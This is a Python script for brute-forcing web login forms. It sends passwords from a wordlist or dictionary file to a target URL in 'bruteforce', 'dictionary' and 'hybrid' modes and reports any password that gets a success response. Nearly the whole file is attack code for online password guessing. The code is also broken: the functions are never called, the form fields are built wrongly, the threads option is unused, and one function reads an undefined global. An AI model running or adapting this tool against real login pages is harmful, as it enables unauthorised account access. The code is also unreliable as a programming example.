import argparse
import itertools
import threading
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from requests.auth import HTTPBasicAuth, HTTPDigestAuth
import colorama
from colorama import Fore, Style, init
init()
colorama.init()

success_count = 0
fail_count = 0

def attack_url(target, mode, username, wordlist, password=None, threads=8):
    global success_count, fail_count
    session = requests.Session()
    retries = Retry(total=5, backoff_factor=0.1, status_forcelist=[ 500, 502, 503, 504 ])
    session.mount('http://', HTTPAdapter(max_retries=retries))
    session.mount('https://', HTTPAdapter(max_retries=retries))

    print(f"[*] Using wordlist: {wordlist}")
    with open(wordlist, "r", errors="ignore") as file:
        passwords = [line.strip() for line in file]
        if mode == "bruteforce":
            for passwd in passwords:
                response = session.post(target, data={username: "", password: passwd})
                if response.status_code == 200:
                    success_count += 1
                    print(f"[*] Password found: {passwd}", colorama.Fore.GREEN + "(success)" + colorama.Fore.RESET)
                    break
                else:
                    fail_count += 1
                    print(f"[-] {passwd} (failed)")
            if success_count == 0:
                print("[!] Password not found.")
        elif mode == "dictionary":
            with open(password, "r", errors="ignore") as file:
                password_list = [line.strip() for line in file]
            for passwd in password_list:
                response = session.post(target, data={username: "", password: passwd})
                if response.status_code == 200:
                    success_count += 1
                    print(f"[*] Password found: {passwd}", colorama.Fore.GREEN + "(success)" + colorama.Fore.RESET)
                    break
                else:
                    fail_count += 1
                    print(f"[-] {passwd} (failed)")
            if success_count == 0:
                print("[!] Password not found.")
        elif mode == "hybrid":
            with open(password, "r", errors="ignore") as file:
                password_list = [line.strip() for line in file]
            for passwd in itertools.product(*zip(passwords, password_list)):
                response = session.post(target, data={username: "", password: passwd[0]})
                if response.status_code == 200:
                    success_count += 1
                    print(f"[*] Password found: {passwd[0]}", colorama.Fore.GREEN + "(success)" + colorama.Fore.RESET)
                    break
                else:
                    fail_count += 1
                    print(f"[-] {passwd[0]} (failed)")
                response = session.post(target, data={username: "", password: passwd[1]})
                if response.status_code == 200:
                    success_count += 1
                    print(f"[*] Password found: {passwd[1]}", colorama.Fore.GREEN + "(success)" + colorama.Fore.RESET)
                    break
                else:
                    fail_count += 1
                    print(f"[-] {passwd[1]} (failed)")
            if success_count == 0:
                print("[!] Password not found.")
        else:
            print("[!] Invalid mode.")

    print(f"[*] {success_count} successful attempts, {fail_count} failed attempts.")

def attack_credentials(target, mode, credentials, threads=8):
    session = requests.session()

    if mode == 'bruteforce':
        if credentials is None:
            print(f'{Fore.RED}[-] ERROR: You must specify a wordlist.{Style.RESET_ALL}')
            return

        with open(credentials, 'r') as f:
            for line in f:
                password = line.strip()
                print(f'Trying password: {password}')
                res = session.post(target, data={'username': args.username, 'password': password})
                if res.status_code == 200 and 'login' not in res.url:
                    print(f'{Fore.GREEN}[+] Password found: {password}{Style.RESET_ALL}')
                    return
                else:
                    print(f'{Fore.RED}[-] Login failed.{Style.RESET_ALL}')
    else:
        if credentials is None:
            print(f'{Fore.RED}[-] ERROR: You must specify a dictionary.{Style.RESET_ALL}')
            return

        with open(credentials, 'r') as f:
            for line in f:
                password = line.strip()
                print(f'Trying password: {password}')
                res = session.post(target, data={'username': args.username, 'password': password})
                if res.status_code == 200 and 'login' not in res.url:
                    print(f'{Fore.GREEN}[+] Password found: {password}{Style.RESET_ALL}')
                    return
                else:
                    print(f'{Fore.RED}[-] Login failed.{Style.RESET_ALL}')

if __name__ == '__main__':


    parser = argparse.ArgumentParser(description='Brute force a login page using a wordlist or dictionary.')

parser.add_argument('target', metavar='URL',
                    help='URL of the login page')
parser.add_argument('-m', '--mode', choices=['bruteforce', 'dictionary'], default='bruteforce',
                    help='mode of attack (default: bruteforce)')
parser.add_argument('-u', '--username', metavar='USERNAME',
                    help='username to brute force')
parser.add_argument('-p', '--password', metavar='PASSWORD',
                    help='password to brute force')
parser.add_argument('-w', '--wordlist', metavar='WORDLIST',
                    help='path to wordlist')
parser.add_argument('-d', '--dictionary', metavar='DICTIONARY',
                    help='path to dictionary')
parser.add_argument('-t', '--threads', type=int, default=8,
                    help='number of threads to use (default: 8)')

args = parser.parse_args()
print("working")

# Now you can use args.target, args.mode, args.username, args.password, args.wordlist, args.dictionary, and args.threads in your code
